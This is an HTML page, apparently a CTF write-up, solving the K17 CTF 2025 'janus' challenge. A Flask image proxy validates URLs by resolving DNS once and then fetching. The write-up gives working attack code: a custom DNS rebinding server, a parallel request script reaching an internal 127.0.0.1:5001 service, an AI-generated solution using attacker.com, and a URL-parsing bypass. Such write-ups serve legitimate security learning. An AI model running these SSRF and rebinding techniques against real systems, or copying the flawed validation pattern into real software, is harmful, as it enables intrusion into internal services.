@@ -1,0 +1,522 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-09-19-k17-ctf-2025/janus.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>janus - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#janus" class="nav-link">janus</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="janus">janus</h1>
+<pre class="highlight"><code>Someone hacked my space image viewer, but it's 100% secure now! Note: Attacking nasa's API is out of scope for this challenge and you may brute force at most 100 requests at one request per second.
+https://janus.secso.cc </code></pre>
+<p>Attachment:</p>
+<pre class="highlight"><code class="language-python">from flask import Flask, request, Response, abort, render_template
+import time
+import socket
+import requests
+from urllib.parse import urlparse
+
+app = Flask(__name__)
+
+# Resolve NASA's IP at startup
+NASA_HOST = "images-api.nasa.gov"
+
+@app.route("/")
+def index():
+    return render_template("index.html")
+
+@app.route("/api")
+def api():
+    NASA_IPS = set(socket.gethostbyname_ex(NASA_HOST)[2]).union({'3.175.115.68', '3.175.115.60', '3.175.115.113', '3.175.115.52'})
+
+    target_url = request.args.get("url")
+    if not target_url:
+        abort(400, "Missing url parameter")
+
+    # Parse the target URL
+    parsed = urlparse(target_url)
+    if not parsed.scheme:
+        target_url = "https://" + target_url  # assume https if missing
+        parsed = urlparse(target_url)
+
+    hostname = parsed.hostname
+    if not hostname:
+        abort(400, "Invalid URL")
+
+    # Prevent users brute forcing our api
+    time.sleep(1)
+    try:
+        resolved_ip = socket.gethostbyname(hostname)
+    except socket.gaierror as e:
+        abort(400, "Unable to resolve hostname")
+
+    # Verify that the url provided resolve's to NASA's IP address
+    if resolved_ip not in NASA_IPS:
+        abort(403, "URL does not resolve to NASA")
+
+    # Fetch and stream the content
+    try:
+        r = requests.get(target_url, stream=True, timeout=5)
+        if r.status_code == 429:
+            abort(429, f"Rate limited by NASA. (This challenge is still solvable)")
+
+        r.raise_for_status()
+    except requests.RequestException as e:
+        print("failed to fetch", target_url, e)
+        abort(502, "Failed to fetch data")
+
+    return Response(
+        r.iter_content(chunk_size=8192),
+        content_type=r.headers.get("Content-Type", "application/octet-stream"),
+    )</code></pre>
+<p>There is a hidden service listening on <code>127.0.0.1:5001</code>:</p>
+<pre class="highlight"><code class="language-python">from flask import Flask, request, Response, abort
+
+app = Flask(__name__)
+
+@app.route("/")
+def root():
+    return "the flag will go here"</code></pre>
+<p>The container name in <code>docker-compose.yml</code> gives the hint:</p>
+<pre class="highlight"><code class="language-yaml"># Note that this is equivalent to:
+# docker run -p 1337:1337 --dns 1.1.1.1 imagename
+
+services:
+  unnamed-dns-rebinding:
+    build: .
+    ports:
+      - "1337:1337"
+    dns:
+      - 1.1.1.1</code></pre>
+<p>Using DNS rebinding attack, we:</p>
+<ol>
+<li>changes the address that one hostname resolves to quickly</li>
+<li>to pass the IP validation, the hostname resolves to a valid IP address for the first time</li>
+<li>after one second, when the request is sent, the hostname resolves to <code>127.0.0.1</code></li>
+<li>so <code>http://127.0.0.1:5001</code> is accessed from the server</li>
+<li>to avoid DNS caching, each time a new random hostname is used</li>
+</ol>
+<p>To achieve this, we use a custom DNS server, based on a <a href="https://gist.github.com/pklaus/b5a7876d4d2cf7271873">gist</a>:</p>
+<pre class="highlight"><code class="language-python">#!/usr/bin/env python
+"""
+LICENSE http://www.apache.org/licenses/LICENSE-2.0
+"""
+
+import argparse
+import datetime
+import sys
+import time
+import threading
+import traceback
+import socketserver
+import struct
+import random
+
+try:
+    from dnslib import *
+except ImportError:
+    print(
+        "Missing dependency dnslib: &lt;https://pypi.python.org/pypi/dnslib&gt;. Please install it with `pip`."
+    )
+    sys.exit(2)
+
+
+TTL = 1
+
+
+def dns_response(data):
+    request = DNSRecord.parse(data)
+
+    print(request)
+
+    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+
+    qname = request.q.qname
+    qn = str(qname)
+    qtype = request.q.qtype
+    qt = QTYPE[qtype]
+
+    IPs = ["3.175.115.68", "127.0.0.1"]
+    random.shuffle(IPs)
+    reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IPs[0])))
+
+    print("---- Reply:\n", reply)
+
+    return reply.pack()
+
+
+class BaseRequestHandler(socketserver.BaseRequestHandler):
+
+    def get_data(self):
+        raise NotImplementedError
+
+    def send_data(self, data):
+        raise NotImplementedError
+
+    def handle(self):
+        now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S.%f")
+        print(
+            "\n\n%s request %s (%s %s):"
+            % (
+                self.__class__.__name__[:3],
+                now,
+                self.client_address[0],
+                self.client_address[1],
+            )
+        )
+        try:
+            data = self.get_data()
+            print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
+            self.send_data(dns_response(data))
+        except Exception:
+            traceback.print_exc(file=sys.stderr)
+
+
+class TCPRequestHandler(BaseRequestHandler):
+
+    def get_data(self):
+        data = self.request.recv(8192).strip()
+        sz = struct.unpack("&gt;H", data[:2])[0]
+        if sz &lt; len(data) - 2:
+            raise Exception("Wrong size of TCP packet")
+        elif sz &gt; len(data) - 2:
+            raise Exception("Too big TCP packet")
+        return data[2:]
+
+    def send_data(self, data):
+        sz = struct.pack("&gt;H", len(data))
+        return self.request.sendall(sz + data)
+
+
+class UDPRequestHandler(BaseRequestHandler):
+
+    def get_data(self):
+        return self.request[0].strip()
+
+    def send_data(self, data):
+        return self.request[1].sendto(data, self.client_address)
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Start a DNS implemented in Python.")
+    parser = argparse.ArgumentParser(
+        description="Start a DNS implemented in Python. Usually DNSs use UDP on port 53."
+    )
+    parser.add_argument("--port", default=5053, type=int, help="The port to listen on.")
+    parser.add_argument("--tcp", action="store_true", help="Listen to TCP connections.")
+    parser.add_argument("--udp", action="store_true", help="Listen to UDP datagrams.")
+
+    args = parser.parse_args()
+    if not (args.udp or args.tcp):
+        parser.error("Please select at least one of --udp or --tcp.")
+
+    print("Starting nameserver...")
+
+    servers = []
+    if args.udp:
+        servers.append(
+            socketserver.ThreadingUDPServer(("", args.port), UDPRequestHandler)
+        )
+    if args.tcp:
+        servers.append(
+            socketserver.ThreadingTCPServer(("", args.port), TCPRequestHandler)
+        )
+
+    for s in servers:
+        thread = threading.Thread(
+            target=s.serve_forever
+        )  # that thread will start one more thread for each request
+        thread.daemon = True  # exit the server thread when the main thread terminates
+        thread.start()
+        print(
+            "%s server loop running in thread: %s"
+            % (s.RequestHandlerClass.__name__[:3], thread.name)
+        )
+
+    try:
+        while 1:
+            time.sleep(1)
+            sys.stderr.flush()
+            sys.stdout.flush()
+
+    except KeyboardInterrupt:
+        pass
+    finally:
+        for s in servers:
+            s.shutdown()
+
+
+if __name__ == "__main__":
+    main()</code></pre>
+<p>Run it on a VPS with public IP address, and point a NS of a subdomain that we own to it:</p>
+<pre class="highlight"><code class="language-shell">sudo python3 server.py --udp --tcp --port 53</code></pre>
+<p>Then, we send request to the server in parallel:</p>
+<pre class="highlight"><code class="language-python">import requests
+import random
+import multiprocessing
+import time
+from multiprocessing import Process, Queue
+
+
+def worker_function(url):
+    try:
+        r = requests.get(
+            f"https://janus.secso.cc/api?url=http%3A%2F%2F{prefix}.test.jiegec.me:5001"
+        )
+        q.put(r.text)
+    except:
+        q.put("")
+        pass
+
+
+if __name__ == "__main__":
+    while True:
+        prefix = random.randint(0, 1000000000)
+        # The NS of the REDACTED hostname points to the custom DNS server
+        url = f"https://janus.secso.cc/api?url=http%3A%2F%2F{prefix}.REDACTED:5001"
+
+        parallel = 16
+        procs = []
+        q = Queue()
+        for i in range(parallel):
+            proc = multiprocessing.Process(target=worker_function, args=(url,))
+            proc.start()
+            procs.append(proc)
+
+        res = []
+        for i in range(parallel):
+            res.append(q.get())
+
+        print(res)
+
+        for i in range(parallel):
+            procs[i].join()</code></pre>
+<p>Flag: <code>K17{DNS___more_l1ke_d0main_name_shuffl3}</code>.</p>
+<p>DeepSeek:</p>
+<pre class="highlight"><code>To solve this CTF challenge, you need to exploit Server-Side Request Forgery (SSRF) to access a service running on `127.0.0.1:5001`. The Flask application restricts access to URLs that resolve to NASA's IP addresses. However, by using DNS rebinding, you can bypass this restriction.
+
+### Solution
+1. **Set up a domain** with DNS records that point to both a NASA IP and `127.0.0.1`. Use a NASA IP from the allowed list (e.g., `3.175.115.68`). Configure the DNS with two A records:
+   - `attacker.com` IN A `3.175.115.68`
+   - `attacker.com` IN A `127.0.0.1`
+   Set a very low TTL (e.g., 1 second) and enable round-robin to ensure that consecutive DNS queries return different IPs.
+
+2. **Make a request** to the Flask app's `/api` endpoint with the URL parameter set to `http://attacker.com:5001/`. For example:
+   ```
+   http://flask-app.com/api?url=http://attacker.com:5001/
+   ```
+   This URL uses port `5001` to target the local service.
+
+3. **How it works**:
+   - The server sleeps for 1 second, then resolves `attacker.com` using `socket.gethostbyname()`. Due to round-robin, it may receive the NASA IP, passing the check.
+   - The server then uses `requests.get()` to fetch the URL. This triggers another DNS resolution for `attacker.com`. Due to round-robin, it may receive `127.0.0.1`, causing the request to connect to the local service on port `5001`.
+   - If the first resolution returns `127.0.0.1`, the check fails, so you may need to repeat the request until it succeeds.
+
+4. **Result**: The response from the Flask app will include the content from `127.0.0.1:5001`, which may contain the flag.
+
+### Note
+- This exploit relies on DNS rebinding and may require multiple attempts due to the round-robin DNS behavior.
+- Ensure that the domain you use has DNS configured correctly with low TTL and round-robin enabled.
+
+GET /api?url=http://attacker.com:5001/ HTTP/1.1
+Host: flask-app.com</code></pre>
+<p>P.S. @bensonby provides a simple solution on Discord:</p>
+<pre class="highlight"><code>my (unintended?) solve for janus:
+
+https://janus.secso.cc/api?url=https://your_own_website.redirecting.tolocalhost5001\@images-api.nasa.gov</code></pre></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
